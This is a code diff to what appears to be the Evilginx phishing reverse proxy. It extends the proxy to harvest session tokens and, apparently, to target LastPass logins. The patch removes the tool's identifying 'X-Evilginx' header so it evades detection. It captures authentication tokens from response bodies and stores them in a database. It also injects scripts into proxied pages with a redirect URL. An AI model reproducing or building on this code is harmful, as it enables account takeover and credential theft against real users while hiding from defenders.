@@ -454,6 +454,24 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				}
 			}
 
+
+
+			// Remove X-Evilginx header
+			_, x_header := req.Header["X-Evilginx"];
+    		if x_header {
+        		delete(req.Header, "X-Evilginx");
+    		};
+
+    		// TODO: Set "Trust this device for 30 days"
+        	// TODO: Get the necessary cookies set by javascript
+    		// For some reason POST requests with empty bodies causes an error with Lastpass
+    		_, content_length := req.Header["Content-Length"];
+    		if content_length {
+				if req.Header["Content-Length"][0] == "0" {
+        			req.Method = "GET";
+        		}  ;
+        	};
+
 			return req, nil
 		})
 
@@ -567,13 +585,36 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			if ck.String() != "" {
 				resp.Header.Add("Set-Cookie", ck.String())
 			}
+
+			// modify received body
+			body, err := ioutil.ReadAll(resp.Body)	
+
+			if pl != nil && ps.SessionId != "" && resp.StatusCode == 200 {
+				c_domain := ctx.Req.Host
+				ck_Name := ctx.Req.URL.Path
+				if pl.isAuthToken(c_domain, ck_Name) {
+					s, ok := p.sessions[ps.SessionId]
+					if ok && (s.IsAuthUrl || !s.IsDone) {
+						if len(body) != 0 { // empty values are of no interest to us
+							is_auth = s.AddAuthToken(c_domain, ck_Name, string(body), ck_Name, false, auth_tokens)
+							if len(pl.authUrls) > 0 {
+								is_auth = false
+							}
+							if is_auth {
+								if err := p.db.SetSessionTokens(ps.SessionId, s.Tokens); err != nil {
+									log.Error("database: %v", err)
+								}
+								s.IsDone = true
+							}
+						}
+					}
+				}
+			}
+
 			if is_auth {
 				// we have all auth tokens
 				log.Success("[%d] all authorization tokens intercepted!", ps.Index)
 			}
-
-			// modify received body
-			body, err := ioutil.ReadAll(resp.Body)
 
 			mime := strings.Split(resp.Header.Get("Content-type"), ";")[0]
 			if err == nil {
@@ -670,6 +711,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 									js_nonce = " nonce=\"" + m_nonce[1] + "\""
 								}
 								re := regexp.MustCompile(`(?i)(<\s*/body\s*>)`)
+								script =  strings.Replace(script, "{{REDIRECT_URL}}", s.RedirectURL, -1)
 								body = []byte(re.ReplaceAllString(string(body), "<script"+js_nonce+">"+script+"</script>${1}"))
 							}
 						}
